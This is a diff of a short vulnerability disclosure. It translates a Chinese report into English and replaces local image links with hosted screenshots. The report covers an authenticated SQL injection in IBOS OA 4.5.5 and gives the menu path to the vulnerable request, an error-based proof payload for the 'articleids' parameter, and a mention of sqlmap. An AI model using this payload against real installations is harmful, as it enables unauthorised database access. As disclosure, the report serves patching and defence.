@@ -1,21 +1,18 @@
-ibos oa v4.5.5存在SQL注入漏洞
+SQL injection vulnerability in ibos oa v4.5.5
 
-官方网站： http: [//www.ibos.com.cn/](http://www.ibos.com.cn/)
+official website： http://www.ibos.com.cn/
 
-版本：4.5.5 pro
+version：4.5.5 
 
-登录后台。综合办公=>信息公告=>发布信息=>删除信息=>删除日志抓包 报错注入成功
+Log in to the background. General Office => Information Bulletin => Release Information => Delete Information => Delete Log Capture Error Injection Successful
 
-![img](file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml9632\wps6.jpg) 
+![wps1](https://github.com/xiaosed/cve/assets/84080097/c33504f6-da94-4f41-a7e5-9561ea01085b)
+![wps3](https://github.com/xiaosed/cve/assets/84080097/e89e0bc9-b068-46e2-ada2-d6f374472fb7)
+![wps4](https://github.com/xiaosed/cve/assets/84080097/0d9489e9-4657-44a7-8c4b-4335fdbb159d)
 
-![img](file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml9632\wps7.jpg) 
-
- 
-
-![img](file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml9632\wps8.jpg) 
 
 Payload：articleids=extractvalue(1,concat(char(126),md5(1404461947)))
 
 Sqlmap：
 
-![img](file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml9632\wps9.jpg)
+![wps5](https://github.com/xiaosed/cve/assets/84080097/541a9259-e4b5-42a5-8534-e3f7a6877069)
